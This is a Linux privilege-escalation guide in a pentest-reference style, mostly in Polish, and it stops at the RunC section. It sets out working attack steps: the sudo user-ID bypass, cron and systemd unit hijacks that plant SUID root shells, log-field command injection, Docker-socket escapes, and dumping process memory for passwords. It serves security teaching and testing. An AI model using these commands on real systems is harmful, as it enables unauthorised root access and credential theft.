# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informacje o systemie

### Informacje o OS

Zacznijmy od zebrania informacji o działającym systemie operacyjnym
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Ścieżka

Jeśli **masz uprawnienia zapisu w dowolnym folderze w zmiennej `PATH`** możesz być w stanie przejąć niektóre libraries lub binaries:
```bash
echo $PATH
```
### Informacje o środowisku

Czy w zmiennych środowiskowych znajdują się interesujące informacje, hasła lub klucze API?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Sprawdź wersję kernela i czy istnieje exploit, który można wykorzystać do escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Możesz znaleźć dobrą listę podatnych jąder i kilka już **compiled exploits** tutaj: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Inne strony, na których możesz znaleźć kilka **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Aby wyodrębnić wszystkie podatne wersje jądra z tej strony możesz zrobić:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Narzędzia, które mogą pomóc w wyszukiwaniu kernel exploits to:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (uruchomić na victim, sprawdza tylko exploity dla kernela 2.x)

Zawsze **wyszukaj wersję kernela w Google**, być może Twoja wersja kernela jest wymieniona w jakimś kernel exploit i wtedy będziesz mieć pewność, że ten exploit jest ważny.

Additional kernel exploitation technique:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Wersja Sudo

Na podstawie podatnych wersji Sudo, które pojawiają się w:
```bash
searchsploit sudo
```
Możesz sprawdzić, czy wersja sudo jest podatna, używając tego polecenia grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Wersje sudo przed 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) pozwalają nieuprzywilejowanym lokalnym użytkownikom na eskalację uprawnień do root przez opcję sudo `--chroot`, gdy plik `/etc/nsswitch.conf` jest używany z katalogu kontrolowanego przez użytkownika.

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Before running the exploit, make sure that your `sudo` version is vulnerable and that it supports the `chroot` feature.

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Od @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: weryfikacja podpisu nie powiodła się

Sprawdź **smasher2 box of HTB** dla **przykładu** tego, jak ta vuln mogła zostać wykorzystana
```bash
dmesg 2>/dev/null | grep "signature"
```
### Więcej enumeracji systemu
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Wymień możliwe zabezpieczenia

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Jeśli znajdujesz się wewnątrz kontenera Docker, możesz spróbować się z niego wydostać:


{{#ref}}
docker-security/
{{#endref}}

## Dyski

Sprawdź **co jest zamontowane i odmontowane**, gdzie i dlaczego. Jeśli coś jest odmontowane, możesz spróbować to zamontować i sprawdzić, czy nie zawiera prywatnych informacji
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Przydatne oprogramowanie

Wymień przydatne binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Sprawdź także, czy **jakikolwiek kompilator jest zainstalowany**. Jest to przydatne, jeśli będziesz musiał użyć jakiegoś kernel exploit, ponieważ zaleca się skompilować go na maszynie, na której zamierzasz go użyć (lub na podobnej).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Zainstalowane podatne oprogramowanie

Sprawdź **wersję zainstalowanych pakietów i usług**. Być może istnieje jakaś stara wersja Nagios (na przykład), która mogłaby zostać wykorzystana do escalating privileges…\
Zaleca się ręczne sprawdzenie wersji bardziej podejrzanego zainstalowanego oprogramowania.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Jeśli masz dostęp SSH do maszyny, możesz także użyć **openVAS**, aby sprawdzić, czy na maszynie nie jest zainstalowane przestarzałe lub podatne oprogramowanie.

> [!NOTE] > _Zwróć uwagę, że te polecenia pokażą dużo informacji, które w większości będą bezużyteczne; dlatego zaleca się użycie aplikacji takich jak OpenVAS lub podobnych, które sprawdzą, czy zainstalowane wersje oprogramowania są podatne na znane exploits_

## Procesy

Zobacz, **jakie procesy** są uruchamiane i sprawdź, czy któryś proces nie ma **więcej uprawnień niż powinien** (może tomcat uruchamiany jako root?)
```bash
ps aux
ps -ef
top -n 1
```
Zawsze sprawdzaj, czy nie działają [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** wykrywa je, sprawdzając parametr `--inspect` w linii poleceń procesu.\
Również **sprawdź swoje privileges nad binaries procesów**, może uda Ci się nadpisać któryś z nich.

### Monitorowanie procesów

Możesz użyć narzędzi takich jak [**pspy**](https://github.com/DominicBreuker/pspy) do monitorowania procesów. To może być bardzo przydatne do zidentyfikowania podatnych procesów uruchamianych często lub gdy spełniony jest określony zestaw warunków.

### Pamięć procesu

Niektóre usługi serwera zapisują **credentials w postaci jawnego tekstu w pamięci**.\
Zwykle będziesz potrzebować **root privileges**, aby odczytać pamięć procesów należących do innych użytkowników, dlatego jest to zazwyczaj bardziej przydatne, gdy jesteś już root i chcesz odkryć więcej credentials.\
Jednak pamiętaj, że **jako zwykły użytkownik możesz odczytać pamięć procesów, których jesteś właścicielem**.

> [!WARNING]
> Należy pamiętać, że obecnie większość maszyn **nie pozwala na ptrace domyślnie**, co oznacza, że nie możesz zrzucać innych procesów należących do nieuprzywilejowanego użytkownika.
>
> Plik _**/proc/sys/kernel/yama/ptrace_scope**_ kontroluje dostępność ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: wszystkie procesy mogą być debugowane, o ile mają ten sam uid. To klasyczny sposób działania ptrace.
> - **kernel.yama.ptrace_scope = 1**: debugowany może być tylko proces rodzica.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

Jeśli masz dostęp do pamięci usługi FTP (na przykład), możesz uzyskać Heap i przeszukać w nim credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Skrypt GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Dla danego identyfikatora procesu **maps pokazuje, jak pamięć jest zmapowana w wirtualnej przestrzeni adresowej tego procesu**; pokazuje również **uprawnienia każdego zmapowanego regionu**. Plik pseudo **mem** **ujawnia samą pamięć procesu**. Z pliku **maps** wiemy, które **regiony pamięci są czytelne** oraz ich offsety. Wykorzystujemy te informacje, aby **seek into the mem file and dump all readable regions** do pliku.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` zapewnia dostęp do **fizycznej** pamięci systemu, a nie do pamięci wirtualnej. Do przestrzeni adresowej wirtualnej pamięci jądra można uzyskać dostęp przez /dev/kmem.\  
Zazwyczaj, `/dev/mem` jest czytelny tylko dla **root** i grupy **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump to wersja dla Linuxa klasycznego narzędzia ProcDump z pakietu Sysinternals dla Windows. Pobierz ją z [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Narzędzia

Aby zrzucić pamięć procesu możesz użyć:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Możesz ręcznie usunąć wymagania root i zrzucić proces należący do Ciebie
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (wymagany root)

### Poświadczenia z pamięci procesu

#### Ręczny przykład

Jeśli znajdziesz, że proces authenticator jest uruchomiony:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Możesz dump the process (zobacz wcześniejsze sekcje, aby znaleźć różne sposoby na dump the memory of a process) i wyszukać credentials w pamięci:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Narzędzie [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) będzie wykradać poświadczenia w postaci czystego tekstu z pamięci oraz z niektórych dobrze znanych plików. Wymaga uprawnień root, aby działać poprawnie.

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Wyszukiwanie wyrażeń regularnych/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zaplanowane zadania/Cron jobs

### Crontab UI (alseambusher) uruchomione jako root – web-based scheduler privesc

Jeśli panel webowy “Crontab UI” (alseambusher/crontab-ui) działa jako root i jest związany wyłącznie z loopback, możesz nadal uzyskać do niego dostęp przez SSH local port-forwarding i utworzyć uprzywilejowane zadanie, aby przeprowadzić privesc.

Typowy łańcuch
- Odnajdź port dostępny tylko na loopback (np. 127.0.0.1:8000) i realm Basic-Auth za pomocą `ss -ntlp` / `curl -v localhost:8000`
- Znajdź poświadczenia w artefaktach operacyjnych:
- Kopie zapasowe/skrypty z `zip -P <password>`
- jednostka systemd ujawniająca `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tuneluj i zaloguj się:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Utwórz high-priv job i uruchom od razu (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Użyj tego:
```bash
/tmp/rootshell -p   # root shell
```
Umacnianie zabezpieczeń
- Nie uruchamiaj Crontab UI jako root; ogranicz go do dedykowanego użytkownika i minimalnych uprawnień
- Wiąż z localhost i dodatkowo ogranicz dostęp przez firewall/VPN; nie używaj ponownie haseł
- Unikaj osadzania sekretów w unit files; użyj secret stores lub EnvironmentFile dostępnego tylko dla root
- Włącz audit/logging dla wykonywania zadań na żądanie

Sprawdź, czy któreś zaplanowane zadanie jest podatne. Może będziesz mógł skorzystać ze skryptu uruchamianego przez root (wildcard vuln? można modyfikować pliki, których używa root? użyć symlinks? stworzyć konkretne pliki w katalogu, którego używa root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Ścieżka crona

For example, inside _/etc/crontab_ you can find the PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Zwróć uwagę, że użytkownik "user" ma uprawnienia zapisu do /home/user_)

Jeśli w tym crontabie użytkownik root próbuje wykonać jakąś komendę lub skrypt bez ustawienia PATH. Na przykład: _\* \* \* \* root overwrite.sh_\
Wtedy możesz uzyskać powłokę roota, używając:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron używający skryptu z wildcardem (Wildcard Injection)

Jeśli skrypt uruchamiany przez root ma “**\***” w poleceniu, możesz to wykorzystać, aby wykonać nieoczekiwane rzeczy (np. privesc). Przykład:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**If the wildcard is preceded of a path like** _**/some/path/\***_ **, it's not vulnerable (even** _**./\***_ **is not).**

Przeczytaj następującą stronę, aby uzyskać więcej trików związanych z wildcard exploitation:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash wykonuje parameter expansion i command substitution przed arithmetic evaluation w ((...)), $((...)) i let. Jeśli root cron/parser odczytuje niezaufane pola z logów i wprowadza je do kontekstu arytmetycznego, atakujący może wstrzyknąć command substitution $(...), które wykona się jako root podczas uruchomienia crona.

- Why it works: W Bashu ekspansje występują w tej kolejności: parameter/variable expansion, command substitution, arithmetic expansion, a następnie word splitting i pathname expansion. Zatem wartość taka jak `$(/bin/bash -c 'id > /tmp/pwn')0` jest najpierw podstawiana (uruchamiając polecenie), a następnie pozostające numeryczne `0` jest używane do obliczenia arytmetycznego, dzięki czemu skrypt kontynuuje bez błędów.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Spraw, by tekst kontrolowany przez atakującego został zapisany do parsowanego logu tak, aby pole wyglądające na numerowe zawierało command substitution i kończyło się cyfrą. Upewnij się, że twoje polecenie nie wypisuje nic na stdout (lub przekieruj je), aby arytmetyka pozostała poprawna.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Jeśli skrypt uruchamiany przez root używa **directory where you have full access**, może być przydatne usunąć ten folder i **create a symlink folder to another one**, wskazujący na inny katalog serwujący script kontrolowany przez ciebie.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Częste zadania cron

Możesz monitorować procesy, aby wykryć te, które są uruchamiane co 1, 2 lub 5 minut. Być może możesz to wykorzystać i escalate privileges.

Na przykład, aby **monitorować co 0.1s przez 1 minutę**, **posortować według najmniej wykonywanych poleceń** i usunąć polecenia, które były wykonywane najczęściej, możesz zrobić:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Możesz też użyć** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (to będzie monitorować i wypisywać każdy proces, który się uruchomi).

### Niewidoczne cron jobs

Możliwe jest utworzenie cronjobu **umieszczając znak powrotu karetki po komentarzu** (bez znaku nowej linii), a cronjob będzie działał. Przykład (zwróć uwagę na znak powrotu karetki):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Usługi

### Pliki _.service_ z prawem zapisu

Sprawdź, czy możesz zapisać którykolwiek plik `.service`, jeśli możesz, **możesz go zmodyfikować** tak, aby **uruchamiał** twój **backdoor gdy** usługa jest **uruchamiana**, **restartowana** lub **zatrzymywana** (może być konieczne poczekać, aż maszyna zostanie zrebootowana).\
Na przykład umieść swój backdoor w pliku .service używając **`ExecStart=/tmp/script.sh`**

### Pliki binarne usług z prawem zapisu

Pamiętaj, że jeśli masz **uprawnienia do zapisu plików binarnych uruchamianych przez usługi**, możesz je podmienić na backdoor, dzięki czemu po ponownym uruchomieniu usług backdoor zostanie uruchomiony.

### systemd PATH - Ścieżki względne

Możesz zobaczyć PATH używany przez **systemd** za pomocą:
```bash
systemctl show-environment
```
Jeśli odkryjesz, że możesz **zapisywać** w którymkolwiek z folderów na tej ścieżce, możesz być w stanie **eskalować uprawnienia**. Musisz wyszukać plików konfiguracji usług używających **ścieżek względnych**, takich jak:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Następnie utwórz wykonywalny plik o tej samej nazwie co binarka wskazywana przez względną ścieżkę wewnątrz folderu PATH systemd, do którego masz prawa zapisu — gdy serwis zostanie poproszony o wykonanie podatnej akcji (Start, Stop, Reload), twój backdoor zostanie uruchomiony (użytkownicy bez uprawnień zazwyczaj nie mogą startować/zatrzymywać serwisów, ale sprawdź, czy możesz użyć `sudo -l`).

**Learn more about services with `man systemd.service`.**

## **Timers**

**Timers** to jednostki systemd, których nazwa kończy się na `**.timer**`, i które kontrolują pliki `**.service**` lub zdarzenia. **Timers** mogą być używane jako alternatywa dla cron, ponieważ mają wbudowane wsparcie dla zdarzeń opartych na czasie kalendarzowym i zdarzeń monotonicznych oraz mogą działać asynchronicznie.

Możesz wylistować wszystkie timery za pomocą:
```bash
systemctl list-timers --all
```
### Zapisywalne timery

Jeśli możesz zmodyfikować timer, możesz sprawić, że wykona on istniejące jednostki systemd.unit (takie jak `.service` lub `.target`).
```bash
Unit=backdoor.service
```
W dokumentacji możesz przeczytać, czym jest Unit:

> Jednostka, która ma zostać aktywowana, gdy ten timer wygaśnie. Argument to nazwa jednostki, której sufiks nie jest ".timer". Jeśli nie zostanie określony, ta wartość domyślnie wskazuje na .service o tej samej nazwie co jednostka timer, z wyjątkiem sufiksu. (Zobacz powyżej.) Zaleca się, aby nazwa jednostki aktywowanej oraz nazwa jednostki timer były identyczne, z wyjątkiem sufiksu.

Therefore, to abuse this permission you would need to:

- Znajdź jakąś jednostkę systemd (np. `.service`), która **uruchamia zapisywalny plik binarny**
- Znajdź jednostkę systemd, która **uruchamia względną ścieżkę** i nad którą masz **uprawnienia zapisu** do **systemd PATH** (aby podszyć się pod ten plik wykonywalny)

**Dowiedz się więcej o timerach za pomocą `man systemd.timer`.**

### **Włączanie timera**

Aby włączyć timer potrzebujesz uprawnień root i wykonać:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Zauważ, że **timer** jest **aktywowany** przez utworzenie symlink-a do niego w `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Gniazda

Unix Domain Sockets (UDS) umożliwiają **komunikację procesów** na tej samej lub różnych maszynach w modelu klient-serwer. Wykorzystują standardowe pliki deskryptorów Unix do komunikacji międzykomputerowej i są konfigurowane za pomocą plików `.socket`.

Gniazda można konfigurować za pomocą plików `.socket`.

**Dowiedz się więcej o gniazdach za pomocą `man systemd.socket`.** W tym pliku można skonfigurować kilka interesujących parametrów:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Te opcje są różne, ale w skrócie służą do **wskazania, gdzie będzie nasłuchiwać** gniazdo (ścieżka pliku gniazda AF_UNIX, adres IPv4/6 i/lub numer portu do nasłuchiwania itp.)
- `Accept`: Przyjmuje argument boolean. Jeśli **true**, instancja service jest tworzona dla każdego przychodzącego połączenia i przekazywane jest do niej tylko gniazdo połączenia. Jeśli **false**, wszystkie gniazda nasłuchujące są **przekazywane do uruchomionej jednostki service**, i tylko jedna jednostka service jest tworzona dla wszystkich połączeń. Ta wartość jest ignorowana dla socketów datagramowych i FIFO, gdzie pojedyncza jednostka service bezwarunkowo obsługuje cały ruch przychodzący. **Domyślnie false**. Ze względów wydajnościowych zaleca się pisać nowe demony w sposób odpowiedni dla `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Przyjmują jedną lub więcej linii poleceń, które są **wykonywane przed** lub **po** utworzeniu i powiązaniu nasłuchujących **gniazd**/FIFO, odpowiednio. Pierwszym tokenem linii poleceń musi być absolutna nazwa pliku, po której następują argumenty dla procesu.
- `ExecStopPre`, `ExecStopPost`: Dodatkowe **komendy**, które są **wykonywane przed** lub **po** zamknięciu i usunięciu nasłuchujących **gniazd**/FIFO, odpowiednio.
- `Service`: Określa nazwę jednostki service, którą należy **aktywować** przy **ruchu przychodzącym**. To ustawienie jest dozwolone tylko dla socketów z Accept=no. Domyślnie wskazuje usługę o tej samej nazwie co socket (z odpowiednio zmienionym sufiksem). W większości przypadków nie powinno być konieczne używanie tej opcji.

### Pliki .socket możliwe do zapisu

Jeśli znajdziesz **zapiswalny** plik `.socket`, możesz **dodać** na początku sekcji `[Socket]` coś w stylu: `ExecStartPre=/home/kali/sys/backdoor` i backdoor zostanie uruchomiony przed utworzeniem socketu. W związku z tym **prawdopodobnie będziesz musiał poczekać na ponowne uruchomienie maszyny.**\
_Uwaga: system musi używać tej konfiguracji pliku socket, w przeciwnym razie backdoor nie zostanie uruchomiony_

### Zapiswalne gniazda

Jeśli **znajdziesz jakiekolwiek zapiswalne gniazdo** (_mówimy tu o Unix Sockets, a nie o plikach konfiguracyjnych `.socket`_), to **możesz komunikować się** z tym gniazdem i być może wykorzystać jakąś podatność.

### Enumeracja Unix Sockets
```bash
netstat -a -p --unix
```
### Surowe połączenie
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Przykład eksploatacji:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Zwróć uwagę, że mogą istnieć niektóre **sockets listening for HTTP** requests (_Nie mam na myśli plików .socket, lecz plików działających jako unix sockets_). Możesz to sprawdzić za pomocą:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Jeśli socket **odpowiada na zapytanie HTTP**, możesz z nim **komunikować się** i być może **wykorzystać jakąś lukę**.

### Zapisowalny socket Dockera

Socket Dockera, często znajdujący się pod `/var/run/docker.sock`, to krytyczny plik, który powinien być zabezpieczony. Domyślnie jest zapisywalny przez użytkownika `root` i członków grupy `docker`. Posiadanie dostępu zapisu do tego socketu może prowadzić do eskalacji uprawnień. Poniżej przedstawiono, jak można to osiągnąć oraz alternatywne metody, gdy Docker CLI nie jest dostępne.

#### **Eskalacja uprawnień przy użyciu Docker CLI**

Jeśli masz dostęp do zapisu socketu Dockera, możesz eskalować uprawnienia, używając następujących poleceń:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Te polecenia pozwalają uruchomić kontener z dostępem roota do systemu plików hosta.

#### **Użycie Docker API bezpośrednio**

W przypadkach, gdy Docker CLI nie jest dostępny, gniazdo Dockera można nadal manipulować przy użyciu Docker API i poleceń `curl`.

1.  **List Docker Images:** Pobierz listę dostępnych obrazów.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Wyślij żądanie utworzenia kontenera, który montuje katalog root systemu hosta.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Uruchom nowo utworzony kontener:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Użyj `socat`, aby nawiązać połączenie z kontenerem, umożliwiając wykonywanie poleceń w jego wnętrzu.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Po skonfigurowaniu połączenia `socat` możesz wykonywać polecenia bezpośrednio w kontenerze z dostępem roota do systemu plików hosta.

### Inne

Zauważ, że jeśli masz uprawnienia zapisu do docker socket ponieważ jesteś **inside the group `docker`** masz [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Jeśli [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Sprawdź **more ways to break out from docker or abuse it to escalate privileges** w:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Jeśli możesz użyć polecenia **`ctr`**, przeczytaj następującą stronę, ponieważ **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Jeśli możesz użyć polecenia **`runc`**, przeczytaj następującą stronę, ponieważ **you may be able to abuse it to escalate privileges**:


